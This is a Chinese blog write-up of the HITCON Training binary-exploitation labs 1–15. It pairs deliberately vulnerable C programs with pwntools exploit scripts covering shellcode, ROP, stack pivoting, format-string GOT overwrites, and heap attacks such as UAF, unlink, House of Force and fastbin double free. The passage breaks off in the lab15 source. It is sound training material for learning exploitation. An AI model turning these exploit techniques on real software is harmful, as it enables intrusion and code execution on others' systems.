---
title: HITCON Training 练习记录
date: 2020-02-16 20:32:19
tags:
  - 栈漏洞
  - fsb
  - 堆漏洞
categories:
  - 系统安全
---

HITCON Training 更新完成，没咕咕。其中堆题真是很适合入门。

<!--more-->

## lab1 - sysmagic

源码：

```c
#include <stdio.h>
#include <unistd.h>

void get_flag(){
    int fd ;
    int password;
    int magic ;
    char key[] ="Do_you_know_why_my_teammate_Orange_is_so_angry???";
    char cipher[] = {7, 59, 25, 2, 11, 16, 61, 30, 9, 8, 18, 45, 40, 89, 10, 0, 30, 22, 0, 4, 85, 22, 8, 31, 7, 1, 9, 0, 126, 28, 62, 10, 30, 11, 107, 4, 66, 60, 44, 91, 49, 85, 2, 30, 33, 16, 76, 30, 66};
    fd = open("/dev/urandom",0);
    read(fd,&password,4);
    printf("Give me maigc :");
    scanf("%d",&magic);
    if(password == magic){
        for(int i = 0 ; i < sizeof(cipher) ; i++){
            printf("%c",cipher[i]^key[i]);
        }
    }
}

int main(){
    setvbuf(stdout,0,2,0);
    get_flag();
    return 0 ;
}
```

`/dev/urandom` 的随机数是很难预测的，因此我们只能想办法让 `if` 条件判断失效。可以用 IDA 将对应的 `jnz` 语句 patch 成 `jz` 就可以打印 flag 了。当然也可以 gdb 设置 `eip` 跳过这个 `jnz`。

## lab2 - orw

本题没有提供源码。开了 seccomp 沙箱，只能用 orw 写 shellcode，题目会自动执行写入的 shellcode。

```py
from pwn import *
binary = './orw.bin'
context.binary = binary
p = process(binary)

shellcode = shellcraft.open('/flag',0) + shellcraft.read('eax','esp',100) + shellcraft.write(1,'esp',100)
p.sendlineafter(':',asm(shellcode))

p.interactive()
```

## lab3 - ret2sc

源码：

```c
#include <stdio.h>

char name[50];

int main(){
    setvbuf(stdout,0,2,0);
    printf("Name:");
    read(0,name,50);
    char buf[20];
    printf("Try your best:");
    gets(buf);
    return ;
}
```

没有开启 NX，因此第一次输入可以输入 shellcode 放在 bss 段，第二次输入栈溢出返回到 shellcode 所在地址。

```py
from pwn import *

binary = './ret2sc'
context.binary = binary
p = process(binary)

name = 0x804a060
p.sendlineafter(':',asm(shellcraft.sh()))
p.sendlineafter(':',flat('a'*32,name))

p.interactive()
```

## lab4 - ret2lib

源码：

```c
#include <stdio.h>

void See_something(unsigned int addr){
    int *address ;
    address = (int *)addr ;
    printf("The content of the address : %p\n",*address);
};

void Print_message(char *mesg){
    char buf[48];
    strcpy(buf,mesg);
    printf("Your message is : %s",buf);
}

int main(){
    char address[10] ;
    char message[256];
    unsigned int addr ;
    puts("###############################");
    puts("Do you know return to library ?");
    puts("###############################");
    puts("What do you want to see in memory?");
    printf("Give me an address (in dec) :");
    fflush(stdout);
    read(0,address,10);
    addr = strtol(address);
    See_something(addr) ;
    printf("Leave some message for me :");
    fflush(stdout);
    read(0,message,256);
    Print_message(message);
    puts("Thanks you ~");
    return 0 ;
}
```

经典的 ret2libc 题目，第一次输入可以直接泄露 GOT 地址，第二次栈溢出返回到 `system("/bin/sh")`。

```py
sla(':',elf.got['puts'])
ru('0x')
puts = int(ru('\n'),16)
base,libc,system = leak_libc('puts',puts)

binsh = base+libc.dump('str_bin_sh')
sla(':',flat('a'*60,system,'a'*4,binsh))
```

## lab5 - simplerop

源码：

```c
#include <stdio.h>

int main(){
    char buf[20];
    puts("ROP is easy is'nt it ?");
    printf("Your input :");
    fflush(stdout);
    read(0,buf,100);

}
```

程序是静态链接的，其中有很多 gadgets 但没有 `/bin/sh`，因此我们需要自己写到 bss 段上去，然后 ret2syscall。

```py
read = 0x806cd50
pop_eax = 0x80bae06
pop_dcb = 0x806e850
int_80 = 0x80493e1

chain = [
    'a'*32,
    # read(0,bss,8)
    read,pop_dcb,0,elf.bss(),8,
    # execve('/bin/sh',0,0)
    pop_dcb,0,0,elf.bss(),pop_eax,0xb,int_80
]

sla(':',flat(chain))
s('/bin/sh\x00')
```

## lab6 - migration

源码：

```c
#include <stdio.h>

int count = 1337 ;

int main(){
    if(count != 1337)
        _exit(1);
    count++;
    char buf[40];
    setvbuf(stdout,0,2,0);
    puts("Try your best :");
    read(0,buf,64);
    return ;
}
```

设置了 `count` 使得 `main` 不能执行第二次。这导致我们无法直接实现 ret2libc，同时栈溢出的空间较小，放不下 ROP 链，因此考虑栈迁移。

首先通过 `read` 读取泄露 libc 的 ROP 链到 `buf`，然后 `leave_ret` 迁移到 `buf`。继续 `read` 读取 `system("/bin/sh")` 的 ROP 链到 `fub`，然后 `leave_ret` 迁移到 `fub`。

```py
buf = elf.bss()+0x300
fub = elf.bss()+0x400
leave_ret = 0x8048418
pop3 = 0x8048569
pop_ebx = 0x804836d

payload = flat('a'*0x28,buf,elf.plt['read'],leave_ret,0,buf,0x100)
sa(':\n',payload)

payload = flat(fub,elf.plt['puts'],pop_ebx,elf.got['puts'],elf.plt['read'],leave_ret,0,fub,0x100)
s(payload)

puts = u32(r(4))
base,libc,system = leak_libc('puts',puts)
binsh = base + libc.dump('str_bin_sh')
payload = flat('a'*4,system,'a'*4,binsh)
s(payload)
```

## lab7 - crack

源码：

```c
#include <stdio.h>
#include <unistd.h>
#include <time.h>
#include <stdlib.h>

unsigned int password ;

int main(){

    setvbuf(stdout,0,2,0);
    char buf[100];
    char input[16];
    int fd ;
    srand(time(NULL));
    fd = open("/dev/urandom",0);
    read(fd,&password,4);
    printf("What your name ?");
    read(0,buf,99);
    printf("Hello ,");
    printf(buf);
    printf("Your password :");
    read(0,input,15);
    if(atoi(input) != password){
        puts("Goodbyte");
    }else{
        puts("Congrt!!");
        system("cat /home/crack/flag");
    }
}
```

存在格式化字符串漏洞，考虑利用该漏洞修改 `password` 为确定的值，然后输入该值即可。

```py
def exec_fmt(payload):
    io = process(binary)
    io.sendlineafter('?',payload)
    io.recvuntil('Hello ,')
    info = io.recvline()
    io.close()
    return info
auto = FmtStr(exec_fmt)

password = 0x804a048
payload = fmtstr_payload(auto.offset,{password:1234})
sla('?',payload)
sla(':',1234)
```

## lab8 - craxme

源码：

```c
#include <stdio.h>

int magic = 0 ;

int main(){
    char buf[0x100];
    setvbuf(stdout,0,2,0);
    puts("Please crax me !");
    printf("Give me magic :");
    read(0,buf,0x100);
    printf(buf);
    if(magic == 0xda){
        system("cat /home/craxme/flag");
    }else if(magic == 0xfaceb00c){
        system("cat /home/craxme/craxflag");
    }else{
        puts("You need be a phd");
    }

}
```

同样是格式化字符串漏洞，存在两种利用方法。一种是直接覆盖 `magic` 满足条件：

```py
def exec_fmt(payload):
    io = process(binary)
    io.sendlineafter(':',payload)
    info = io.recvline()
    io.close()
    return info
auto = FmtStr(exec_fmt)

magic = 0x804a038
payload = fmtstr_payload(auto.offset,{magic:0xda})
sla(':',payload)
```

另一种是用 `main` 中的 `read` 开始的语句覆盖 `puts`，然后用 `system` 覆盖 `printf` 来拿到 shell。

```py
main_read = 0x804859b
payload = fmtstr_payload(auto.offset,{elf.got['puts']:main_read,elf.got['printf']:elf.plt['system']})
sla(':',payload)
sl('/bin/sh')
```

## lab9 - playfmt

源码：

```c
#include <stdio.h>
#include <unistd.h>
#include <string.h>

char buf[200] ;

void do_fmt(){
    while(1){
        read(0,buf,200);
        if(!strncmp(buf,"quit",4))
            break;
        printf(buf);
    }
    return ;
}

void play(){
    puts("=====================");
    puts("  Magic echo Server");
    puts("=====================");
    do_fmt();
    return;
}

int main(){
    setvbuf(stdout,0,2,0);
    play();
    return;
}
```

本题依然是格式化字符串漏洞，但问题在于这次并不会将数据读入栈上，而是读入 bss 段。这使得常规 fsb 利用方式失效，但是我们依然可以通过修改 `saved ebp` 来达到任意地址读写。

在 `printf` 前查看栈情况：

```
00:0000│ esp  0xffffcd60 —▸ 0x804a060 (buf) ◂— 'aaaa\n'
01:0004│      0xffffcd64 —▸ 0x8048640 ◂— jno    0x80486b7 /* 'quit' */
02:0008│      0xffffcd68 ◂— 0x4
03:000c│      0xffffcd6c —▸ 0x804857c (play+51) ◂— add    esp, 0x10
04:0010│      0xffffcd70 —▸ 0x8048645 ◂— cmp    eax, 0x3d3d3d3d
05:0014│      0xffffcd74 —▸ 0xf7fb6000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0
06:0018│ ebp  0xffffcd78 —▸ 0xffffcd88 —▸ 0xffffcd98 ◂— 0x0
07:001c│      0xffffcd7c —▸ 0x8048584 (play+59) ◂— nop
08:0020│      0xffffcd80 —▸ 0xf7fb6d60 (_IO_2_1_stdout_) ◂— 0xfbad2887
09:0024│      0xffffcd84 ◂— 0x0
0a:0028│      0xffffcd88 —▸ 0xffffcd98 ◂— 0x0
0b:002c│      0xffffcd8c —▸ 0x80485b1 (main+42) ◂— nop
0c:0030│      0xffffcd90 —▸ 0xf7fb63dc (__exit_funcs) —▸ 0xf7fb71e0 (initial) ◂— 0x0
```

可以看到 `saved ebp` 在 `6$` 位置，它实际上指向位于 `10$` 的 `0xffffcd88`。也就是说，如果我们能通过 `%n` 修改 `saved ebp`，实际上就能修改 `10$` 的位置。

然而，`10$` 这个位置同样可以是一个指针。同理我们也可以 `%n` 修改 `10$` 指向的地址。除了修改，我们同样可以泄露，那么自然想到泄露 libc 函数的 GOT 地址，再覆盖成 system 的做法。

因此思路如下，记栈上偏移为 `10` 的地址为 `ebp2`，偏移为 7 和 11 的地址分别为 `s7` 和 `s11`。

1. 通过 `ebp` 修改 `ebp2` 指向 `s7`
2. 通过 `ebp2` 将 `s7` 覆盖为 `printf@got`
3. 通过 `ebp` 修改 `ebp2` 指向 `s11`
4. 通过 `ebp2` 将 `s11` 覆盖为 `printf@got+2`
5. 通过 `%7$s` 泄露 `s7` 处的 `printf@got`，从而泄露 libc
6. 用 `system@plt` 低 2 字节覆盖 `s7` 处的 `printf@got`
7. 用 `system@plt` 高 2 字节覆盖 `s11` 处的 `printf@got+2`
8. 输入 `/bin/sh\x00`，调用 `printf("/bin/sh")` 即 getshell

当然也可以 4 字节直接写，但是由于字符数过多会导致速度非常慢，不推荐。此外，需要注意即使是 2 字节写依然会有延迟，需要多次 `recv()` 接收返回的字符串，直到发送的特殊字符串能够收到为止，算是 fsb 利用时的一个小技巧。

```py
hn = lambda addr,offset: '%{}c%{}$hn'.format(addr,offset)

def delay():
    while True:
        sl('delay')
        sleep(0.2)
        data = r()
        if data.find('delay') != -1:
            break

for i in range(3):
    ru('\n')
sl('%6$p')
ebp2 = int(ru('\n'),16)
ebp = ebp2-0x10
s7 = ebp2-0xc
s11 = ebp2+4
mask = 0xffff
printf = elf.got['printf']

sl(hn(s7&mask,6))
sl(hn(printf&mask,10))
delay()
sl(hn(s11&mask,6))
sl(hn((printf+2)&mask,10))
delay()

sl('aaaa%7$s')
ru('aaaa')
printf = u32(r(4))
leak('printf',printf)
base,libc,system = leak_libc('printf',printf)

sl(hn(system&mask,7)+hn((system>>16)-(system&mask),11))
delay()

sl('/bin/sh\x00')
```

## lab10 - hacknote

源码：

```c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

struct note {
    void (*printnote)();
    char *content ;
};

struct note *notelist[5];
int count = 0;

void print_note_content(struct note *this){
    puts(this->content);
}
void add_note(){
    int i ;
    char buf[8];
    int size ;
    if(count> 5){
        puts("Full");
        return ;
    }
    for(i = 0 ; i < 5 ; i ++){
        if(!notelist[i]){
            notelist[i] = (struct note*)malloc(sizeof(struct note));
            if(!notelist[i]){
                puts("Alloca Error");
                exit(-1);
            }
            notelist[i]->printnote = print_note_content;
            printf("Note size :");
            read(0,buf,8);
            size = atoi(buf);
            notelist[i]->content = (char *)malloc(size);
            if(!notelist[i]->content){
                puts("Alloca Error");
                exit(-1);
            }
            printf("Content :");
            read(0,notelist[i]->content,size);
            puts("Success !");
            count++;
            break;
        }
    }
}

void del_note(){
    char buf[4];
    int idx ;
    printf("Index :");
    read(0,buf,4);
    idx = atoi(buf);
    if(idx < 0 || idx>= count){
        puts("Out of bound!");
        _exit(0);
    }
    if(notelist[idx]){
        free(notelist[idx]->content);
        free(notelist[idx]);
        puts("Success");
    }
}

void print_note(){
    char buf[4];
    int idx ;
    printf("Index :");
    read(0,buf,4);
    idx = atoi(buf);
    if(idx < 0 || idx>= count){
        puts("Out of bound!");
        _exit(0);
    }
    if(notelist[idx]){
        notelist[idx]->printnote(notelist[idx]);
    }
}

void magic(){
    system("cat /home/hacknote/flag");
}


void menu(){
    puts("----------------------");
    puts("       HackNote");
    puts("----------------------");
    puts(" 1. Add note");
    puts(" 2. Delete note");
    puts(" 3. Print note");
    puts(" 4. Exit");
    puts("----------------------");
    printf("Your choice :");
};

int main(){
    setvbuf(stdout,0,2,0);
    setvbuf(stdin,0,2,0);
    char buf[4];
    while(1){
        menu();
        read(0,buf,4);
        switch(atoi(buf)){
            case 1 :
                add_note();
                break ;
            case 2 :
                del_note();
                break ;
            case 3 :
                print_note();
                break ;
            case 4 :
                exit(0);
                break ;
            default :
                puts("Invalid choice");
                break ;

        }
    }
    return 0;
}
```

经典的 uaf 利用，做法和 [ACTF2019-babyheap](../ACTF2019Pwn/) 以及 [BJDCTF2019-YDSneedGirlfriend](../BJDCTF2019Pwn) 完全相同。

```py
add(0x10)
add(0x10)
delete(0)
delete(1)
add(0x8,p32(elf.sym['magic']))
show(0)
```

## lab11 - bamboobox

源码：

```c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
struct item{
    int size ;
    char *name ;
};

struct item itemlist[100] = {0};

int num ;

void hello_message(){
    puts("There is a box with magic");
    puts("what do you want to do in the box");
}

void goodbye_message(){
    puts("See you next time");
    puts("Thanks you");
}

struct box{
    void (*hello_message)();
    void (*goodbye_message)();
};

void menu(){
    puts("----------------------------");
    puts("Bamboobox Menu");
    puts("----------------------------");
    puts("1.show the items in the box");
    puts("2.add a new item");
    puts("3.change the item in the box");
    puts("4.remove the item in the box");
    puts("5.exit");
    puts("----------------------------");
    printf("Your choice:");
}


void show_item(){
    int i ;
    if(!num){
        puts("No item in the box");
    }else{
        for(i = 0 ; i < 100; i++){
            if(itemlist[i].name){
                printf("%d : %s",i,itemlist[i].name);
            }
        }
        puts("");
    }
}

int add_item(){

    char sizebuf[8] ;
    int length ;
    int i ;
    int size ;
    if(num < 100){
        printf("Please enter the length of item name:");
        read(0,sizebuf,8);
        length = atoi(sizebuf);
        if(length == 0){
            puts("invaild length");
            return 0;
        }
        for(i = 0 ; i < 100 ; i++){
            if(!itemlist[i].name){
                itemlist[i].size = length ;
                itemlist[i].name = (char*)malloc(length);
                printf("Please enter the name of item:");
                size = read(0,itemlist[i].name,length);
                itemlist[i].name[size] = '\x00';
                num++;
                break;
            }
        }

    }else{
        puts("the box is full");
    }
    return 0;
}



void change_item(){

    char indexbuf[8] ;
    char lengthbuf[8];
    int length ;
    int index ;
    int readsize ;

    if(!num){
        puts("No item in the box");
    }else{
        printf("Please enter the index of item:");
        read(0,indexbuf,8);
        index = atoi(indexbuf);
        if(itemlist[index].name){
            printf("Please enter the length of item name:");
            read(0,lengthbuf,8);
            length = atoi(lengthbuf);
            printf("Please enter the new name of the item:");
            readsize = read(0,itemlist[index].name,length);
            *(itemlist[index].name + readsize) = '\x00';
        }else{
            puts("invaild index");
        }

    }

}

void remove_item(){
    char indexbuf[8] ;
    int index ;

    if(!num){
        puts("No item in the box");
    }else{
        printf("Please enter the index of item:");
        read(0,indexbuf,8);
        index = atoi(indexbuf);
        if(itemlist[index].name){
            free(itemlist[index].name);
            itemlist[index].name = 0 ;
            itemlist[index].size = 0 ;
            puts("remove successful!!");
            num-- ;
        }else{
            puts("invaild index");
        }
    }
}

void magic(){
    int fd ;
    char buffer[100];
    fd = open("/home/bamboobox/flag",O_RDONLY);
    read(fd,buffer,sizeof(buffer));
    close(fd);
    printf("%s",buffer);
    exit(0);
}

int main(){

    char choicebuf[8];
    int choice;
    struct box *bamboo ;
    setvbuf(stdout,0,2,0);
    setvbuf(stdin,0,2,0);
    bamboo = malloc(sizeof(struct box));
    bamboo->hello_message = hello_message;
    bamboo->goodbye_message = goodbye_message ;
    bamboo->hello_message();

    while(1){
        menu();
        read(0,choicebuf,8);
        choice = atoi(choicebuf);
        switch(choice){
            case 1:
                show_item();
                break;
            case 2:
                add_item();
                break;
            case 3:
                change_item();
                break;
            case 4:
                remove_item();
                break;
            case 5:
                bamboo->goodbye_message();
                exit(0);
                break;
            default:
                puts("invaild choice!!!");
                break;

        }
    }

    return 0 ;
}
```

存在全局数组 `itemlist`，第一种办法就是利用它进行 unlink，劫持 `atoi` 到 `magic`：

```py
ptr = 0x6020c8
add(0x80)
add(0x80)
add(0x80)
fd = ptr-0x18
bk = ptr-0x10
payload = flat(0,0x81,fd,bk,'a'*0x60,0x80,0x90)
edit(0,len(payload),payload)
delete(1)


# hijack to magic
payload = flat(0,0,0,elf.got['atoi'])
edit(0,len(payload),payload)
edit(0,0x8,p64(elf.sym['magic']))
sla('choice:','5')
```

或者劫持到 `system` 也可以：

```py
# OR hijack to system
payload = flat(0,0,0,elf.got['atoi'])
edit(0,len(payload),payload)
show()
ru('0 :')
atoi = uu64(ru('2 :'))
system,binsh = ret2libc(atoi,'atoi')
edit(0,0x8,p64(system))
sla('choice:','/bin/sh\x00')
```

第二种办法是 House of Force。程序开头就 `malloc` 了 `0x10` 的 `box` 用来放两个函数，其中第二个会在退出时调用，我们只需要覆盖第二个函数为 `magic` 即可。先通过溢出修改 top chunk 大小为 - 1，然后计算 `evil_size`：减去自身大小以及 `box` 的大小，再减去一个头部的大小即可。这种方法简单了很多。

```py
add(0x60)
edit(0,0x70,flat('a'*0x60,0,0xffffffffffffffff))
evil_size = -(0x60+0x10) - (0x10+0x10) - 0x10
add(evil_size)
add(0x10,p64(elf.sym['magic'])*2)
sla('choice:','5')
```

## lab12 - secretgarden

源码：

```c
#include <stdio.h>
#include <signal.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#define TIMEOUT 60


struct flower{
    int vaild ;
    char *name ;
    char color[24] ;
};


struct flower* flowerlist[100] ;
unsigned int flowercount = 0 ;



void menu(){
    puts("");
    puts("☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆");
    puts("☆         Baby Secret Garden      ☆");
    puts("☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆");
    puts("");
    puts("  1 . Raise a flower");
    puts("  2 . Visit the garden");
    puts("  3 . Remove a flower from the garden");
    puts("  4 . Clean the garden");
    puts("  5 . Leave the garden");
    puts("");
    printf("Your choice :");
}

int add(){
    struct flower *newflower = NULL ;
    char *buf = NULL ;
    unsigned size =0;
    unsigned index ;
    if(flowercount < 100){
        newflower = malloc(sizeof(struct flower));
        memset(newflower,0,sizeof(struct flower));
        printf("Length of the name :");
        if(scanf("%u",&size)== EOF) exit(-1);
        buf = (char*)malloc(size);
        if(!buf){
            puts("Alloca error !!");
            exit(-1);
        }
        printf("The name of flower :");
        read(0,buf,size);
        newflower->name = buf ;
        printf("The color of the flower :");
        scanf("%23s",newflower->color);
        newflower->vaild = 1 ;
        for(index = 0 ; index < 100 ; index++){
            if(!flowerlist[index]){
                flowerlist[index] = newflower ;
                break ;
            }
        }
        flowercount++ ;
        puts("Successful !");
    }else{
        puts("The garden is overflow");
    }
}

int del(){
    unsigned int index ;
    if(!flowercount){
        puts("No flower in the garden");
    }else{
        printf("Which flower do you want to remove from the garden:");
        scanf("%d",&index);
        if(index < 0 ||index>= 100 || !flowerlist[index]){
            puts("Invalid choice");
            return 0 ;
        }
        (flowerlist[index])->vaild = 0 ;
        free((flowerlist[index])->name);
        puts("Successful");
    }
}

void magic(){
    int fd ;
    char buffer[100];
    fd = open("/home/babysecretgarden/flag",O_RDONLY);
    read(fd,buffer,sizeof(buffer));
    close(fd);
    printf("%s",buffer);
    exit(0);
}

void clean(){
    unsigned index ;
    for(index = 0 ; index < 100 ; index++){
        if(flowerlist[index] && (flowerlist[index])->vaild == 0){
            free(flowerlist[index]);
            flowerlist[index] = NULL;
            flowercount--;
        }
    }
    puts("Done!");
}

int visit(){
    unsigned index ;
    if(!flowercount){
        puts("No flower in the garden !");
    }else{
        for(index = 0 ; index < 100 ; index++){
            if(flowerlist[index] && (flowerlist[index])->vaild){
                printf("Name of the flower[%u] :%s\n",index,(flowerlist[index])->name);
                printf("Color of the flower[%u] :%s\n",index,(flowerlist[index])->color);
            }
        }
    }
}

void handler(int signum){
    puts("timeout");
    exit(1);
}
void init(){
    int fd;
    fd = open("/dev/urandom",0);
    close(fd);
    setvbuf(stdout,0,2,0);
    signal(SIGALRM,handler);
    alarm(TIMEOUT);
}


int main(){
    init();
    int choice ;
    char buf[10];
    while(1){
        menu();
        read(0,buf,8);
        choice = atoi(buf);
        switch(choice){
            case 1:
                add();
                break ;
            case 2:
                visit();
                break ;
            case 3:
                del();
                break ;
            case 4:
                clean();
                break ;
            case 5:
                puts("See you next time.");
                exit(0);
            default :
                puts("Invalid choice");
                break ;
        }

    }

}
```

在删除时存在 double free，利用漏洞修改 `puts@got` 为 `magic` 即可。

```py
add(0x50) # 0
add(0x50) # 1
free(0)
free(1)
free(0)

fake = 0x601ffa
add(0x50,p64(fake))
add(0x50)
add(0x50)
add(0x50,flat('a'*6,0,elf.sym['magic'],elf.sym['magic']))
```

另一种方法是直接 getshell。先通过 unsorted bin 泄露 libc，然后用同样的方法修改 `__malloc_hook` 为 `one_gadget`，最后触发 double free 检测调用 `malloc_printerr`，从而调用 `__malloc_hook`。

```py
add(0x80)
add(0x68)
add(0x68)
free(0)
clean()

add(0x80)
show()
ru('a'*8)
base = uu64(r(6))-88-libc.sym['__malloc_hook']-0x10
leak('base',base)
malloc_hook = base+libc.sym['__malloc_hook']

free(1)
free(2)
free(1)
add(0x68,p64(malloc_hook-0x23))
add(0x68)
add(0x68)
add(0x68,'a'*0x13+p64(base+one[2]))

free(1)
free(1)
```

## lab13 - heapcreator

源码：

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void read_input(char *buf,size_t size){
    int ret ;
    ret = read(0,buf,size);
    if(ret <=0){
        puts("Error");
        _exit(-1);
    }
}

struct heap {
    size_t size ;
    char *content ;
};

struct heap *heaparray[10];

void menu(){
    puts("--------------------------------");
    puts("          Heap Creator");
    puts("--------------------------------");
    puts(" 1. Create a Heap");
    puts(" 2. Edit a Heap");
    puts(" 3. Show a Heap");
    puts(" 4. Delete a Heap");
    puts(" 5. Exit");
    puts("--------------------------------");
    printf("Your choice :");
}

void create_heap(){
    int i ;
    char buf[8];
    size_t size = 0;
    for(i = 0 ; i < 10 ; i++){
        if(!heaparray[i]){
            heaparray[i] = (struct heap *)malloc(sizeof(struct heap));
            if(!heaparray[i]){
                puts("Allocate Error");
                exit(1);
            }
            printf("Size of Heap :");
            read(0,buf,8);
            size = atoi(buf);
            heaparray[i]->content = (char *)malloc(size);
            if(!heaparray[i]->content){
                puts("Allocate Error");
                exit(2);
            }
            heaparray[i]->size = size ;
            printf("Content of heap:");
            read_input(heaparray[i]->content,size);
            puts("SuccessFul");
            break ;
        }
    }
}

void edit_heap(){
    int idx ;
    char buf[4];
    printf("Index :");
    read(0,buf,4);
    idx = atoi(buf);
    if(idx < 0 || idx>= 10){
        puts("Out of bound!");
        _exit(0);
    }
    if(heaparray[idx]){
        printf("Content of heap :");
        read_input(heaparray[idx]->content,heaparray[idx]->size+1);
        puts("Done !");
    }else{
        puts("No such heap !");
    }
}

void show_heap(){
    int idx ;
    char buf[4];
    printf("Index :");
    read(0,buf,4);
    idx = atoi(buf);
    if(idx < 0 || idx>= 10){
        puts("Out of bound!");
        _exit(0);
    }
    if(heaparray[idx]){
        printf("Size : %ld\nContent : %s\n",heaparray[idx]->size,heaparray[idx]->content);
        puts("Done !");
    }else{
        puts("No such heap !");
    }

}

void delete_heap(){
    int idx ;
    char buf[4];
    printf("Index :");
    read(0,buf,4);
    idx = atoi(buf);
    if(idx < 0 || idx>= 10){
        puts("Out of bound!");
        _exit(0);
    }
    if(heaparray[idx]){
        free(heaparray[idx]->content);
        free(heaparray[idx]);
        heaparray[idx] = NULL ;
        puts("Done !");
    }else{
        puts("No such heap !");
    }

}


int main(){
    char buf[4];
    setvbuf(stdout,0,2,0);
    setvbuf(stdin,0,2,0);
    while(1){
        menu();
        read(0,buf,4);
        switch(atoi(buf)){
            case 1 :
                create_heap();
                break ;
            case 2 :
                edit_heap();
                break ;
            case 3 :
                show_heap();
                break ;
            case 4 :
                delete_heap();
                break ;
            case 5 :
                exit(0);
                break ;
            default :
                puts("Invalid Choice");
                break;
        }

    }
    return 0 ;
}
```

本题添加堆时没有检查 `size`，可以整数溢出；编辑堆时存在人为设置的 off by one，因此可以覆盖下一个 chunk 的 `chunk_size` 造成堆块重叠。我们先申请 0x18 的 chunk，需要注意必须以 `8` 结尾以覆盖到 `chunk_size`，然后申请 0x10 的 victim，利用 off by one 修改 victim 的 `chunk_size` 为 0x41 后，释放 victim。

我们知道，原来的 victim 指针是 0x20 的 chunk，victim 的内容也是 0x20 的 chunk。现在 victim 指针变成了 0x40，那么我们可以申请 0x30 的 chunk，使得新 chunk 内容使用的是 victim 的指针 chunk，而新 chunk 的指针使用的是 victim 的内容 chunk。这样我们就能控制整个 victim 了。确保指针内的 `heapsize` 合法，然后在 `content` 对应位置放上要泄露 / 覆盖的函数 GOT，通过 libc 泄露得到 system，最后用 system 劫持 GOT 即可。

```py
add(0x18) # 0
add(0x10) # 1
edit(0,'a'*0x18+'\x41')
delete(1)

# new heap->content = heap1->ptr
# new heap->ptr = heap1->content
add(0x30,flat(0,0,0,0,0x30,elf.got['atoi']))
show(1)
ru('Content :')
atoi = uu64(r(6))
system,binsh = ret2libc(atoi,'atoi')
edit(1,p64(system))
sla('choice :','sh\x00\x00')
```

## lab14 - magicheap

源码：

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void read_input(char *buf,size_t size){
    int ret ;
    ret = read(0,buf,size);
    if(ret <=0){
        puts("Error");
        _exit(-1);
    }
}

char *heaparray[10];
unsigned long int magic = 0 ;

void menu(){
    puts("--------------------------------");
    puts("       Magic Heap Creator");
    puts("--------------------------------");
    puts(" 1. Create a Heap");
    puts(" 2. Edit a Heap");
    puts(" 3. Delete a Heap");
    puts(" 4. Exit");
    puts("--------------------------------");
    printf("Your choice :");
}

void create_heap(){
    int i ;
    char buf[8];
    size_t size = 0;
    for(i = 0 ; i < 10 ; i++){
        if(!heaparray[i]){
            printf("Size of Heap :");
            read(0,buf,8);
            size = atoi(buf);
            heaparray[i] = (char *)malloc(size);
            if(!heaparray[i]){
                puts("Allocate Error");
                exit(2);
            }
            printf("Content of heap:");
            read_input(heaparray[i],size);
            puts("SuccessFul");
            break ;
        }
    }
}

void edit_heap(){
    int idx ;
    char buf[4];
    size_t size ;
    printf("Index :");
    read(0,buf,4);
    idx = atoi(buf);
    if(idx < 0 || idx>= 10){
        puts("Out of bound!");
        _exit(0);
    }
    if(heaparray[idx]){
        printf("Size of Heap :");
        read(0,buf,8);
        size = atoi(buf);
        printf("Content of heap :");
        read_input(heaparray[idx] ,size);
        puts("Done !");
    }else{
        puts("No such heap !");
    }
}


void delete_heap(){
    int idx ;
    char buf[4];
    printf("Index :");
    read(0,buf,4);
    idx = atoi(buf);
    if(idx < 0 || idx>= 10){
        puts("Out of bound!");
        _exit(0);
    }
    if(heaparray[idx]){
        free(heaparray[idx]);
        heaparray[idx] = NULL ;
        puts("Done !");
    }else{
        puts("No such heap !");
    }

}


void l33t(){
    system("cat /home/magicheap/flag");
}

int main(){
    char buf[8];
    setvbuf(stdout,0,2,0);
    setvbuf(stdin,0,2,0);
    while(1){
        menu();
        read(0,buf,8);
        switch(atoi(buf)){
            case 1 :
                create_heap();
                break ;
            case 2 :
                edit_heap();
                break ;
            case 3 :
                delete_heap();
                break ;
            case 4 :
                exit(0);
                break ;
            case 4869 :
                if(magic> 4869){
                    puts("Congrt !");
                    l33t();
                }else
                    puts("So sad !");
                break ;
            default :
                puts("Invalid Choice");
                break;
        }

    }
    return 0 ;
}
```

在 `edit` 时没有检查 `size`，可以堆溢出。题目要求 bss 段的 `magic` 大于 0x1305，且输入数字等于 0x1305，即可 getshell。那么我们释放一个 chunk 到 unsorted bin，利用堆溢出修改其 `bk` 为 `magic-0x10`，再申请回来，那么 `magic` 就会被认为是下一个 unsorted chunk 的 `fd`，被填入 `main_arena+88`，这个值远超 0x1305。

```py
add(0x10) # 0
add(0x80) # 1
add(0x10) # 2

delete(1)
magic = 0x6020a0
fd = 0
bk = magic-0x10
payload = flat('a'*0x10,0,0x91,fd,bk)
edit(0,len(payload),payload)
add(0x80)
sla(':',str(0x1305))
```

## lab15 - zoo

源码：

```c
#include <stdio.h>
#include <iostream>
#include <unistd.h>
#include <vector>
#include <string.h>
using namespace std;

char nameofzoo[100];

class Animal {
    public :
        Animal(){
            memset(name,0,24);
            weight = 0;
        }
        virtual void speak(){;}
        virtual void info(){;}
    protected :
        char name[24];
        int weight;
};

class Dog : public Animal{
    public :
        Dog(string str,int w){
            strcpy(name,str.c_str());
            weight = w ;
        }
        virtual void speak(){
            cout <<"Wow ~ Wow ~ Wow ~" << endl ;
        }
        virtual void info(){
            cout <<"|---------------------|" << endl ;
            cout <<"| Animal info         |" << endl;
            cout <<"|---------------------|" << endl;
            cout <<"  Weight :"<< this->weight << endl ;
            cout <<"  Name : "<< this->name << endl ;
            cout <<"|---------------------|" << endl;
        }
};

class Cat : public Animal{
    public :
        Cat(string str,int w){
            strcpy(name,str.c_str());
            weight = w ;
        }
        virtual void speak(){
